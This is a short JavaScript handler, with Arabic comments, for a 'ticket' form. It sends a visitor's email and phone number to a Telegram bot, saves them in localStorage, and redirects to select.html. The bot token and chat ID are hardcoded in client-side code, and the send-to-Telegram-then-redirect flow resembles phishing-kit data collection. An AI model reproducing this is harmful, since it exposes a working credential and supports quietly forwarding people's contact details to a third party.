const form = document.getElementById('ticketForm');

form.addEventListener('submit', function(e) {
  e.preventDefault();

  const email = document.getElementById('email').value;
  const phone = document.getElementById('phone').value;

  const message = `تذكرة جديدة:\n📧 البريد: ${email}\n📱 الهاتف: ${phone}`;

  const token = "8086646027:AAH2MyOuWFl3Hw-9KfdbbSjbvYp7p9jkjyE"; // ← استبدل هذا بالتوكن الخاص بك
  const chatId = "7595871538"; // ← استبدل هذا بمعرف الشات (Chat ID)

  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  })

  .then(response => {
if (response.ok) {
// 🟢 تخزين البيانات في localStorage
localStorage.setItem("storedPhone", phone);
localStorage.setItem("storedEmail", email);

form.reset();

// يمكنك إعادة التوجيه بعد التخزين إذا أردت
 window.location.href = "select.html";
} else {
alert("فشل في الإرسال. حاول مرة أخرى.");
}
}) });